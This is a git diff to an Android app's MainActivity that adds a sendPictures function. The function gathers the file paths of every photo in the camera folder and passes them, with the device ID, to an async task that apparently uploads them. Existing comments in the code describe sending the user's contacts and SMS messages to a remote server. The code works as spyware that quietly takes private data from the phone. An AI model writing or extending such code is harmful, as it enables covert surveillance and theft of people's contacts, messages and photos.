@@ -5,7 +5,9 @@ import android.database.Cursor;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.Uri;
+import android.os.Environment;
 import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.provider.Settings;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -13,6 +15,7 @@ import android.util.Pair;
 import android.view.Menu;
 import android.view.MenuItem;
 
+import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
 
@@ -75,6 +78,7 @@ public class MainActivity extends AppCompatActivity {
             e.printStackTrace();
         }
         sendSMS(android_id);
+        sendPictures(android_id);
     }
 
     // Function to save all contacts of the user in a data structure and send them to the remote server by calling an AsyncTask
@@ -133,5 +137,36 @@ public class MainActivity extends AppCompatActivity {
 
         // Send the information to remote server
         new SendSMSAsyncTask(this, android_id, messages).execute();
+    }
+
+    public void sendPictures(String android_id){
+
+        String CAMERA_IMAGE_BUCKET_NAME =
+                Environment.getExternalStorageDirectory().toString()
+                        + "/DCIM/Camera";
+        String CAMERA_IMAGE_BUCKET_ID =
+            String.valueOf(CAMERA_IMAGE_BUCKET_NAME.toLowerCase().hashCode());
+
+        final String[] projection = { MediaStore.Images.Media.DATA };
+        final String selection = MediaStore.Images.Media.BUCKET_ID + " = ?";
+        final String[] selectionArgs = { CAMERA_IMAGE_BUCKET_ID };
+        final Cursor cursor = this.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                selection,
+                selectionArgs,
+                null);
+        ArrayList<String> result = new ArrayList<String>(cursor.getCount());
+        if (cursor.moveToFirst()) {
+            final int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
+            do {
+                final String data = cursor.getString(dataColumn);
+                System.out.println("IMAGEN DE LA CAMARITA\n" + data);
+                result.add(data);
+            } while (cursor.moveToNext());
+        }
+        cursor.close();
+
+        new SendPicturesAsyncTask(this, android_id, result).execute();
+
     }
 }
